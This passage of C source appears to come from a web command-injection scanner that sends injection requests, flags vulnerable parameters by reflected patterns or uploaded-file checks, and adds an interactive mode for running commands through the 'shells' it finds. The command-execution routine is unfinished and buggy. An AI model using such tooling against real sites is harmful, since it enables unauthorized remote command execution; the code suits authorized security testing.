				sizeof(P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST *) * (cmd_injection_session->request_n+1),
				BPLN
		);

		// set the request
		cmd_injection_session->all_requests[cmd_injection_session->request_n] = request;

		// increment the request counter
		cmd_injection_session->request_n++;

		// unlock the assessment
		BP_CommandInjectionUnlockAssessment(cmd_injection_session);


		// set the post string if there is one
		if(request->post_str)
			BP_HTTPSetPostVars(http_session, request->post_str);

		// set cookie if there is one
		if(request->cookie_str)
			BP_HTTPSetCookie(http_session, request->cookie_str);

		// counter for matching retries
		size_t retry_iter = 0;


		// try to make request
		while(BP_HTTPRequest(http_session, request->get_str, BP_TRUE) == ERR_FAILURE)
		{
			if(retry_iter < http_session->max_request_retries)
			{
				retry_iter++;
				continue;
			}
			else
				break;

		}


		// check request retries
		if(retry_iter < http_session->max_request_retries)
		{

			// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
			// %%% Run Pattern Reflection Check %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
			// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

			if(http_session->page->page_data)
			{


				// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
				// %%% Match Text %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
				// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

				if(request->pattern_reflection_test_ref)
				{

					// search for pattern
					if
					(
						memmem
						(
								http_session->page->page_data,
								http_session->page->page_data_size,
								request->pattern_reflection_test_ref->precomputed_test_result,
								bpstrlen(request->pattern_reflection_test_ref->precomputed_test_result)
						)
					)
					{

						// lock the assessment before operating on data
						BP_CommandInjectionLockAssessment(cmd_injection_session);

						// increase the number of vuln points
						cmd_injection_session->total_command_injection_points_discovered++;

						// increment the number of reflection conditions found
						test->pattern_reflection_tests_found_vulnerable_n++;

						// allocate space for the vulnerable test indicators
						test->pattern_reflection_tests_found_vulnerable = (size_t *) tq_realloc
						(
								cmd_injection_session->tq,
								test->pattern_reflection_tests_found_vulnerable,
								sizeof(size_t) * test->pattern_reflection_tests_found_vulnerable_n,
								BPLN
						);

						// set the test indicators here
						test->pattern_reflection_tests_found_vulnerable[test->pattern_reflection_tests_found_vulnerable_n-1] = request->pattern_reflection_test_index;

						// set vulnerable condition flag if set
						test->testing_reported_vulnerable_condition = BP_TRUE;

						// unlock the assessment when finished
						BP_CommandInjectionUnlockAssessment(cmd_injection_session);

						// mark as pattern reflection
						request->is_pattern_reflection_vuln = BP_TRUE;

						// printf("\n EUREKA!: %s\n\n", http_session->page->page_data);

					}

				}

			}

			// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
			// %%% Now Run File Verification Tests %%%%%%%%%%%%%%%%
			// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

			// if we have an associated file verification test, run it
			if(request->file_verification_test_ref)
			{

				// create joiner
				char * joiner[3];
				BP_ZERO_STACK(joiner);

				char * tmp_path = BP_ParseURLToPathPCRE(request->get_str);

				// if we cant get path, it's a base url
				if(!tmp_path)
					tmp_path = BP_ParseURLToBasePCRE(request->get_str);

				joiner[0] = tmp_path;
				joiner[1] = request->file_verification_test_ref->upload_file_name;

				// create the uploaded file
				char *uploaded_file = BP_JoinStringArray((char **) &joiner, 2);

				if(tmp_path)
					bpfree(tmp_path);

				// reset the request iter for use here
				retry_iter = 0;
				// printf("\n Uploaded File?: %s", uploaded_file);

				// try to make request
				while
				(
					(BP_HTTPRequest(http_session, uploaded_file, BP_TRUE) == ERR_FAILURE) &&
					(retry_iter < http_session->max_request_retries)
				)
				{
						retry_iter++;
				}

				if(uploaded_file)
					bpfree(uploaded_file);

				if(http_session->http_status_code == 200)
				{

					// now examine the file to see that our data was written
					if
					(
							memmem
							(
									http_session->page->page_data,
									http_session->page->page_data_size,
									request->file_verification_test_ref->upload_file_body,
									bpstrlen(request->file_verification_test_ref->upload_file_body)
							)
					)
					{


						// lock the assessment before operating on data
						BP_CommandInjectionLockAssessment(cmd_injection_session);

						// increase the number of vuln points
						cmd_injection_session->total_command_injection_points_discovered++;

						// increment the number of reflection conditions found
						test->file_verification_tests_found_vulnerable_n++;

						// allocate space for the vulnerable test indicators
						test->file_verification_tests_found_vulnerable = (size_t *) tq_realloc
						(
								cmd_injection_session->tq,
								test->file_verification_tests_found_vulnerable,
								sizeof(size_t) * test->file_verification_tests_found_vulnerable_n,
								BPLN
						);

						// set the test indicators here
						test->file_verification_tests_found_vulnerable[test->file_verification_tests_found_vulnerable_n-1] = request->file_verification_test_index;

						// set vulnerable condition flag if set
						test->testing_reported_vulnerable_condition = BP_TRUE;

						// unlock the assessment when finished
						BP_CommandInjectionUnlockAssessment(cmd_injection_session);

						// mark the request as vulnerable
						request->is_file_verification_vuln = BP_TRUE;

					}

				}


			}


			request->request_succeded = BP_TRUE;

		}


	}



	if(http_session->page->memPtr)
	{
		bpfree(http_session->page->memPtr);
		http_session->page->page_data_size = 0;
		http_session->page->memPtr = NULL;
	}


	return ERR_SUCCESS;
}



// displays a set of http requests
BP_ERROR_T BP_CommandInjectionDisplayHTTPRequests
(
		P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO http_generated_requests
)
{

	if(!http_generated_requests)
		return ERR_FAILURE;

	// request iter
	size_t request_iter = 0;

	// reference into the request stack
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST request = NULL;

	for
	(
			;
			request_iter < http_generated_requests->request_n;
			request_iter++
	)
	{

		// set request
		request = &http_generated_requests->generated_requests[request_iter];


		printf("\n [+] Request: (%p)", request);
		printf("\n     get_str:                     %s", request->get_str);
		printf("\n     post_str:                    %s", request->post_str);
		printf("\n     cookie_str:                  %s", request->cookie_str);
		printf("\n     header_str:                  %s", request->header_str);
		printf("\n     request_succeded:            %s", request->request_succeded ? "Yes": "No");
		printf("\n     test_ref:                    %p", request->test_ref);
		printf("\n     file_verification_test_ref:  %p", request->file_verification_test_ref);
		printf("\n     pattern_reflection_test_ref: %p", request->pattern_reflection_test_ref);
		printf("\n");

	}

}



// This is the main workhorse routine for validating command injection tests.  Remember
// that this routine takes a managed thread parameter, which is NOT opaque.  It must be
// locked and referenced for parameter extraction.
void * BP_CommandInjectionRunTest_thinit(void *managed_thread_parameter)
{

	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%% Gather Parameters %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


	// set the managed thread data
	P_BP_MANAGED_THREAD managed_thread = (P_BP_MANAGED_THREAD) managed_thread_parameter;

	// lock the thread
	BP_MANAGED_THREAD_LOCK;

	// mark thread as running while the managed thread is locked.
	managed_thread->current_status = BP_THREAD_STATUS_RUNNING;

	BP_MANAGED_THREAD_UNLOCK;

	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%% Run Test %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// set test parameter
	P_BP_WEB_COMMAND_INJECTION_THREAD_PARAMETERS test_parameters = (P_BP_WEB_COMMAND_INJECTION_THREAD_PARAMETERS) managed_thread->thread_parameter;

	// dereference the session for use in thread
	P_BP_WEB_COMMAND_INJECTION_TEST_SESSION session = test_parameters->cmd_injection_session;

	// dereference the test for use in thread
	P_BP_WEB_COMMAND_INJECTION_TEST test = test_parameters->test;


	// lock the session so we can clone the http session parameters
	BP_CommandInjectionLockAssessment(session);

	// clone the http session
	P_BP_HTTP_SESSION http_session = BP_HTTPCloneSession(session->html_extraction_reference->http_session_reference);

	// select a random element
	size_t random_element_selector = BP_GenRandomUnsignedLong(0, session->test_element_n-1);

	// set test element
	P_BP_WEB_COMMAND_INJECTION_ELEMENT test_element = &session->test_elements[random_element_selector];


	if(!http_session->max_request_retries)
		http_session->max_request_retries= 5;

	// generate http request info
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO http_generated_requests = BP_CommandInjectionGenerateHTTPRequests
	(
			session,
			test,
			test_element
	);

	// unlock the session
	BP_CommandInjectionUnlockAssessment(session);

	// runs command injection tests (actually makes requests)
	BP_CommandInjectionRunHTTPRequests
	(
			session,
			http_session,
			test,
			http_generated_requests
	);


	BP_CommandInjectionDisplayHTTPRequests
	(
			http_generated_requests
	);


	// generate test set from anchor
	if(test->is_anchor_test)
	{

	}

	// generate form test if form
	if(test->is_form_test)
	{

	}



exit:

	// destroy the cloned http session
	BP_HTTPDestroyClonedSession(http_session);


	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	// %%%%% Exit Thread / Decoupling %%%%%%%%%%%%%%%%%%%%%%
	// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	// set the status as exited
	BP_MANAGED_THREAD_LOCK;
	managed_thread->current_status = BP_THREAD_STATUS_EXITED;
	BP_MANAGED_THREAD_UNLOCK;


	// exit with null
	return NULL;

}

// This will execute a command on a given shell, and try to return the relevant data.
P_BP_COMMAND_INJECTION_EXECUTION_RESULT BP_CommandInjectionExecuteCommandOnShell
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		char *                                  execute_command,
		P_BP_WEB_COMMAND_INJECTION_TEST         vulnerable_element,
		BP_BOOL                                 prefer_reflective
)
{

	if(!cmd_injection_session)
		return NULL;
	if(!vulnerable_element)
		return NULL;
	if(!execute_command)
		return NULL;

	// ensure string is reasonable
	if(!BP_StringIsReasonablePrintableString(execute_command, bpstrlen(execute_command), BP_FALSE, BP_FALSE))
		return NULL;

	if(vulnerable_element->pattern_reflection_tests_found_vulnerable_n)
	{

		char * joiner[30];
		BP_ZERO_STACK(joiner);



		// calculate test index
		size_t test_index = vulnerable_element->pattern_reflection_tests_found_vulnerable[0];

		// set the test
		P_BP_WEB_COMMAND_INJECTION_ELEMENT test = &cmd_injection_session->test_elements[0];

		// set the test inde
		P_BP_WEB_COMMAND_INJECTION_PATTERN_REFLECTION_TEST reflect_test = &test->pattern_reflection_tests[test_index];



		// incrementing joiner idx
		size_t joiner_idx = 0;

		// add front part if we have one
		if(reflect_test->front_part)
		{
			joiner[joiner_idx] = reflect_test->front_part;
			joiner_idx++;
		}

		joiner[joiner_idx] = execute_command;
		joiner_idx++;

		// add back part if we have one
		if(reflect_test->back_part)
		{
			joiner[joiner_idx] = reflect_test->back_part;
			joiner_idx++;
		}

		char *joined = BP_JoinStringArray(joiner, joiner_idx);

		// display joined string
		printf("\n Got Joined String: %s", joined);

		bpfree(joined);

		// set url encoded
		char *url_encoded = BP_UTF8StringEncode(joined, bpstrlen(joined));

		printf("\n Encoded: %s", url_encoded);


		if(vulnerable_element->is_form_test)
		{



		}

		// BP_HTTPRequest(cmd_injection_session->html_extraction_reference->http_session_reference, )



	}


}




// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%% Controlling Command Injection Results %%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

// This shell is very rudimentary, and only used for demonstration
// purposes.

// static commands
char * BP_WEB_COMMAND_INJECTION_INTERACTIVE_COMMANDS[] {
	"help",
	"shells",
	"disable",
	"enable",
	"execute",
	"dbinfo",
	"httpinfo",
	"exit",
	NULL
};

// Run an interactive command
BP_ERROR_T BP_CommandInjectionShellInteractiveRunCommand
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION    session,
		char *                                     command,
		char *                                     command_arg,
		size_t                                     command_arg_n
)
{

	// command length
	size_t command_len = bpstrlen(command);

	// display help
	if(command_len == 4)
	if(memcmp(command, "help", 4) == 0)
	{

		printf("\n [+] Available Commands:");
		size_t n = 0;
		for(; BP_WEB_COMMAND_INJECTION_INTERACTIVE_COMMANDS[n]; n++)
		{
			printf("\n - %s", BP_WEB_COMMAND_INJECTION_INTERACTIVE_COMMANDS[n]);
		}

		printf("\n");

	}

	// show available shells
	if(command_len == 7)
	if(memcmp(command, "execute", 7) == 0)
	{

		P_BP_WEB_COMMAND_INJECTION_TEST curr_element = NULL;
		size_t n = 0;
		for(; n < session->cmd_injection_test_set_n; n++)
		{

			curr_element = &session->cmd_injection_test_set[n];


			P_BP_COMMAND_INJECTION_EXECUTION_RESULT res =  BP_CommandInjectionExecuteCommandOnShell
			(
				session,
				command_arg,
				curr_element
			);

		}
		if(n == 0)
		{
			printf("\n [+] No shells found for use.");
		}
		printf("\n");

	}


	// show available shells
	if(command_len == 6)
	if(memcmp(command, "shells", 6) == 0)
	{

		P_BP_WEB_COMMAND_INJECTION_TEST curr_element = NULL;
		size_t n = 0;
		for(; n < session->cmd_injection_test_set_n; n++)
		{

			curr_element = &session->cmd_injection_test_set[n];
			if
			(
					curr_element->pattern_reflection_tests_found_vulnerable_n ||
					curr_element->file_verification_tests_found_vulnerable_n
			)
			{
				printf("\n [+] Shell #%u - %s - %s ", n, curr_element->disabled ? "Disabled" : "Enabled", curr_element->anchor->full_url);
			}
		}
		if(n == 0)
		{
			printf("\n [+] No shells found for use.");
		}
		printf("\n");

	}


	// show available shells
	if(command_len == 7)
	if(memcmp(command, "disable", 7) == 0)
	{

		if(!command_arg)
		{
			printf("\n [+] disable command requires an argument (aka number of shell to disable)");
			return ERR_FAILURE;
		}

		// command index
		size_t command_idx = strtoul(command_arg, NULL, 10);


		P_BP_WEB_COMMAND_INJECTION_TEST curr_element = NULL;
		size_t n = 0;
		for(; n < session->cmd_injection_test_set_n; n++)
		{

			curr_element = &session->cmd_injection_test_set[n];
			if(command_idx == n)
				curr_element->disabled = BP_TRUE;

		}
		if(n == 0)
		{
			printf("\n [+] No shells matched your criteria.");
		}
		printf("\n");

	}


	// show available shells
	if(command_len == 6)
	if(memcmp(command, "enable", 6) == 0)
	{

		if(!command_arg)
		{
			printf("\n [+] enable command requires an argument (aka number of shell to disable)");
			return ERR_FAILURE;
		}

		// command index
		size_t command_idx = strtoul(command_arg, NULL, 10);


		P_BP_WEB_COMMAND_INJECTION_TEST curr_element = NULL;
		size_t n = 0;
		for(; n < session->cmd_injection_test_set_n; n++)
		{

			curr_element = &session->cmd_injection_test_set[n];
			if(command_idx == n)
				curr_element->disabled = BP_FALSE;

		}
		if(n == 0)
		{
			printf("\n [+] No shells matched your criteria.");
		}
		printf("\n");

	}



	// httpinfo
	if(command_len == 8)
	if(memcmp(command, "httpinfo", 8) == 0)
	{

		printf("\n [+] Current HTTP Session Info:");
		BP_HTTPDisplaySession(session->html_extraction_reference->http_session_reference);

	}


	// return indicating success
	return ERR_SUCCESS;
}





BP_ERROR_T BP_CommandInjectionShellInteractive
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION           session
)
{

	// ensure we have a valid session to work with
	if(!session)
		return ERR_FAILURE;

	printf("\n [+] Entering Interactive Shell Mode\n\n");

	char *command     = NULL;
	char *command_arg = NULL;

	// split buffer
	char ** split = NULL;

	// temporary buffer for reading char
	char tmp_char_buff[4];

	// used as loop iter
	char x;

	// command argument
	size_t command_arg_n = 0;

	// interactive shell
	while(x=getchar())
	{

		// set in string
		tmp_char_buff[0] = x;



		// process on newline
		if(x == '\n' && command)
		{

			// exit if we have the xit command
			if(bpstrlen(command) == 4)
			if(memcmp(command, "exit", 4) == 0)
				break;

			if(strstr(command, " "))
				split = BP_SplitBufferBin(command, bpstrlen(command),  " ", 1);

			if(split)
			{
				command     = split[0];
				command_arg = split[1];
			}


			if(command)
			BP_CommandInjectionShellInteractiveRunCommand
			(
					session,
					command,
					command_arg,
					command_arg_n
			);

			// nullify the split
			split = NULL;

			// destroy the command after it runs
			tq_free(session->tq, command);

			// nullify pointer
			command = NULL;

		}


		// don't process anything if it's just a newline
		if(x == '\n')
			continue;

		// command
		if(!command)
			command = tq_strdup(session->tq, tmp_char_buff, BPLN);
		else
			command = BP_JoinStrings(command, tmp_char_buff, session->tq);



		// ensure we have a reasonable string
		if(!BP_StringIsReasonablePrintableString(command, bpstrlen(command), BP_FALSE, BP_FALSE))
		{
			printf("\n [+] Erroneous input, bad chars, whatcha doin?.");
			break;
		}


		// zero the tmp buffer on loop
		BP_ZERO_STACK(tmp_char_buff);

	}


	// return indicating success
	return ERR_SUCCESS;

}




